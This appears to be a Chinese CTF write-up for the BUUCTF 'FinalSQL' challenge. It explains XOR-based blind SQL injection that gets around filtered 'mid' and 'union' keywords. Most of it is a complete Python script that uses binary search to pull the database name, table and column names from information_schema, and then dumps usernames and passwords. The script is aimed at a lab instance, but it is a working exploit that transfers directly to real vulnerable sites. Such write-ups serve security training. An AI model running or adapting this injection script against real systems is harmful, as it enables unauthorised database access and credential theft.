# [极客大挑战 2019]FinalSQL

## 知识点

`sql注入`

`异或注入`

## 解题

正常情况下`id=1`

![image-20231229115035475](./img/14-1.png)

因为`1^0`为`1`

和`id`为`1`时相同

可以根据这个特性，判断后面的注入语句是否正确。经过测试发现`mid`、`union`被过滤了，可以考虑这个组合拳：

> `ascii(x)` ：只取x中第一位的`ascii`值，这也可以用`ord()`函数代替。

> `substr(string string, int a, int b)`：把`string`从`a`开始进行截取，截取长度为`b`。

判断当前数据库名长度，等于`4`时返回`ERROR`，证明是`1^1`，语句为真：

> 1^(length(database())=4)

判断数据库第一位的`ascii`是否大于`7`，返回`ERROR`，证明是`1^1`，语句为真：

> 1^(ord(substr(database(),1,1))>7)

判断数据库第一位的`ascii`是否大于`199`，返回`NO! Not this! Click others`，证明是`1^0`，语句为假：

> 1^(ord(substr(database(),1,1))>199)

```python
import requests
# from urllib.parse import urljoin

url = 'http://6db75235-0289-49f2-b368-e488330f1b06.node4.buuoj.cn:81/search.php?id='

def judge_database():
    """ 获取数据库长度 """
    for i in range(20):
        tmp_url = f"{url}0^(length(database())={i})"
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"Database length is: {i}")
            break
        print(f"try 0^(length(database())={i})")
        
        
def get_database():
    """ 获取数据库名 """
    database = ''
    for i in range(1, 5): # 因为数据库长度为4
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr(database(),{i},1))<{mid})"
            # print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        database += chr(mid - 1)
    print(f"Database is: {database}")
    
    
def get_tables_length():
    """ 获取表名长度 """
    for i in range(20):
        tmp_url = f"{url}0^((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema='geek'))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"Table length is: {i}")
            break
        
def get_tables():
    """ 获取表名 """
    tables = ''
    for i in range(1, 17): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        tables += chr(mid - 1)
        print(tables)
    print(f"Tables is: {tables}")
    
    
def get_column_length(table_name='Flaaaaag'):
    """ 判断列名长度 """
    for i in range(40):
        tmp_url = f"{url}0^((select(length(group_concat(column_name)))from(information_schema.columns)where(table_name='{table_name}'))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"Column length is: {i}")
            break
        
        
def get_columns_name(table_name='Flaaaaag', column_length=16):
    """ 获取列名 """
    columns = ''
    for i in range(1, column_length + 1): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='{table_name}')),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        columns += chr(mid - 1)
        print(columns)
    print(f"Column is: {columns}")
    
def get_flag_value():
    column_values = ''
    for i in range(1, 17): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        column_values += chr(mid - 1)
        print(column_values)
    print(f"value is: {column_values}")
    
    
def get_all_column_length(column_name='password', table_name='F1naI1y'):
    """ 获取列长度 """
    for i in range(300):
        tmp_url = f"{url}0^((select(length(group_concat({column_name})))from({table_name}))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"All Column length is: {i}")
            break
    
def get_final_flag_value():
    column_values = ''
    for i in range(1, 300):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(username,password))from(F1naI1y)),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        column_values += chr(mid - 1)
        print(column_values)
    print(f"value is: {column_values}")
    
    
if __name__ == '__main__':
    # judge_database()
    # get_database()
    # get_tables_length()
    # get_tables()
    # get_column_length()
    # get_columns_name()
    # get_flag_value()  # 没在那个表里 重新查表
    # get_column_length('F1naI1y')
    # get_columns_name('F1naI1y', 20)
    # get_all_column_length()
    get_final_flag_value()
```

